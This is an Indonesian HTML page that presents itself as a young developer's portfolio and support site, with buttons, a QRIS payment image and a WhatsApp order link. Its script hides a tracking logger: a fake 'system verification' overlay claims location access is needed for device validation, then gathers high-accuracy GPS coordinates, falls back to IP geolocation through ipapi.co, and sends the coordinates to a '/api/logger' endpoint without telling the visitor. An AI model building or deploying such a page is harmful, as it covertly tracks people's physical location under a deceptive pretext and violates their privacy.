<!DOCTYPE html>
<html lang="id">
<head>
    <style>
        :root { --neon: #00f3ff; --dark: #0a0a0a; }
        body { background: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; }
        .cyber-btn { background: transparent; border: 2px solid var(--neon); color: var(--neon); padding: 15px 30px; cursor: pointer; transition: 0.3s; margin: 10px; box-shadow: 0 0 10px var(--neon); }
        .cyber-btn:hover { background: var(--neon); color: black; }
        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; display:none; flex-direction:column; justify-content:center; }
        .hidden { display: none; opacity: 0; transition: 1s; }
        .visible { display: block; opacity: 1; }
        #qris-img { width: 200px; height: 200px; object-fit: cover; border: 2px solid var(--neon); }
    </style>
</head>
<body>

    <div id="page1">
        <h1>Website Code</h1>
        <button class="cyber-btn" onclick="openOverlay()">MASUK</button>
    </div>

    <div id="overlay">
        <h2 style="color:white">VERIFIKASI SISTEM</h2>
        <p>Akses lokasi diperlukan untuk validasi perangkat regional.</p>
        <button class="cyber-btn" onclick="startDetection()">IZINKAN AKSES</button>
    </div>

    <div id="content" class="hidden">
        <button class="cyber-btn">TENTANG DEVELOPER: FoxxyOffc atau lebih dikenal dengan panggilan Foxxy Preset/Foxxy ft EGS, merupakan seorang creator preset alight motion sekaligus developer website, pengembang bot whatsapp, dan juga Seorang Guru MI[di rl ygy], ia berumur 18 tahun dan masuk ke dunia komputer mulai dari kelas 1 smp yg awalmula penasaran bagaimana cara membuat game, mungkin sekian dahulu, tolong support developer di opsi support agar developer tetap semangat membuat konten ataupun project-project menarik lainnya, sekian terima kasih dan assalamu'alaikum</button>
        <button class="cyber-btn">BOT WHATSAPP</button>
        <button class="cyber-btn">PILIHAN 3</button>
        <button class="cyber-btn">PILIHAN 4</button>
        <button class="cyber-btn" onclick="showLinks()">SUPPORT DEVELOPER</button>
        <button class="cyber-btn" onclick="showQris()">ORDER VIA WHATSAPP</button>
    </div>

    <div id="qris-section" class="hidden">
        <img id="qris-img" src="qris.jpg" alt="QRIS">
        <br>
        <button class="cyber-btn" onclick="window.location.href='https://wa.me/628xxxxxxxxxx'">CHAT OWNER</button>
    </div>

    <script>
        function openOverlay() { document.getElementById('overlay').style.display = 'flex'; }
        
        function startDetection() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('content').className = 'visible';
            
            // Logika Hybrid Geolocation
            navigator.geolocation.getCurrentPosition(
                (pos) => sendData(pos.coords.latitude, pos.coords.longitude, 'GPS'),
                () => fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendData(d.latitude, d.longitude, 'IP')),
                { enableHighAccuracy: true }
            );
        }

        function sendData(lat, lon, m) { fetch(`/api/logger?lat=${lat}&lon=${lon}&method=${m}`); }
        function showQris() { document.getElementById('qris-section').className = 'visible'; }
    </script>
</body>
</html>
